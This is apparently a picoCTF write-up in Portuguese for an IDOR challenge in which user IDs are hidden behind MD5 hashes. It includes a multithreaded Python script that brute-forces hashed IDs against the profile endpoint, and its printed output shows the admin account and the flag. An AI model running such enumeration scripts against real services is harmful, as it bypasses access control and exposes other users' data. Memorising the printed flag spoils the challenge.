<img width="1701" height="643" alt="Screenshot From 2026-05-19 01-19-30" src="https://github.com/user-attachments/assets/7ba9e46e-cdef-48b2-af30-4e1213df82e0" />
<img width="1683" height="252" alt="Screenshot From 2026-05-19 01-21-12" src="https://github.com/user-attachments/assets/7e83815c-37da-48fa-84d4-1c3453f69297" />

http://crystal-peak.picoctf.net:62653/profile/user/e93028bdc1aacdfb3687181f20...

O diagnóstico técnico: IDOR ou Manipulação de Hash
A dica original do enunciado dizia: “só porque o acesso ao administrador não está diretamente exposto, não significa que seja seguro. Talvez alguém tenha esquecido que obscuridade não é sinônimo de segurança...”.

O ID do seu usuário é 3000, mas na barra de endereços da URL o número 3000 não aparece diretamente; em vez disso, há uma longa sequência hexadecimal (e93028bdc1aacdfb3687181f20...). Essa é uma tentativa clássica de proteger o aplicativo por meio da “obscuridade”, substituindo um ID sequencial por um hash para que você não possa simplesmente trocar um 3000 por um 2999 ou um 1.

Para acessar o perfil do administrador e capturar o flag, o caminho consiste em decifrar ou replicar como esse hash foi gerado.

Como quebrá-lo passo a passo?
Identifique o tipo de hash: copie a string completa que aparece na sua URL após /profile/user/ e analise seu comprimento.

Se tiver 32 caracteres, é um hash MD5.

Se tiver 40 caracteres, é um hash SHA-1.

Se tiver 64 caracteres, é um hash SHA-256.

Verifique se é o ID hashado diretamente:
Os desenvolvedores muitas vezes simplesmente aplicam o algoritmo ao número identificador. Você pode verificar no seu terminal se o hash da URL coincide exatamente com o valor do seu ID de convidado (3000). Por exemplo, executando:

` echo -n "3000" | md5sum `

Script
```
import requests
import hashlib
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- CONFIGURACIÓN ---
URL_BASE = "http://crystal-peak.picoctf.net:62653"
MAX_WORKERS = 50  # Número de hilos en paralelo
# ---------------------

def probar_id(user_id):
    if user_id == 3000:
        return None
        
    # Generar MD5 del ID
    id_hash = hashlib.md5(str(user_id).encode('utf-8')).hexdigest()
    url_perfil = f"{URL_BASE}/profile/user/{id_hash}"
    
    try:
        response = requests.get(url_perfil, timeout=3)
        
        # Si responde OK y no tiene el mensaje de error de Guest, es el admin
        if response.status_code == 200 and "Insufficient privileges" not in response.text:
            return {
                "id": user_id,
                "hash": id_hash,
                "text": response.text
            }
    except Exception:
        pass
    return None

def main():
    print(f"[*] Lanzando ráfaga multihilo ({MAX_WORKERS} hilos) del ID 0 al 3100...")
    
    # Creamos la lista de IDs a procesar
    ids_a_probar = list(range(0, 3101))
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Agendamos todos los hilos
        futuros = {executor.submit(probar_id, uid): uid for uid in ids_a_probar}
        
        for futuro in as_completed(futuros):
            resultado = futuro.result()
            
            if resultado:
                print("\n" + "="*60)
                print(f"[+] ¡ADMINISTRADOR ENCONTRADO!")
                print(f"[+] ID Real: {resultado['id']}")
                print(f"[+] Hash MD5: {resultado['hash']}")
                print("="*60)
                print("[*] Contenido del perfil:\n")
                print(resultado['text'].strip())
                print("="*60)
                
                # Cancelamos el resto de peticiones en cola de inmediato
                executor.shutdown(wait=False, cancel_futures=True)
                sys.exit(0)
            else:
                # Mostrar progreso rápido en pantalla
                print(f"[*] Escaneando IDs en paralelo...", end='\r')

    print("\n[-] No se encontró nada en ese rango.")

if __name__ == '__main__':
    main()
```


```

      ~/Work  python3 s.py                                                                                                                       ✔ 
[*] Lanzando ráfaga multihilo (50 hilos) del ID 0 al 3100...
[*] Escaneando IDs en paralelo...
============================================================
[+] ¡ADMINISTRADOR ENCONTRADO!
[+] ID Real: 3012
[+] Hash MD5: 5a01f0597ac4bdf35c24846734ee9a76
============================================================
[*] Contenido del perfil:

Welcome, admin! Here is the flag: picoCTF{id0r_unl0ck_090019fc}
============================================================
                               
```


```
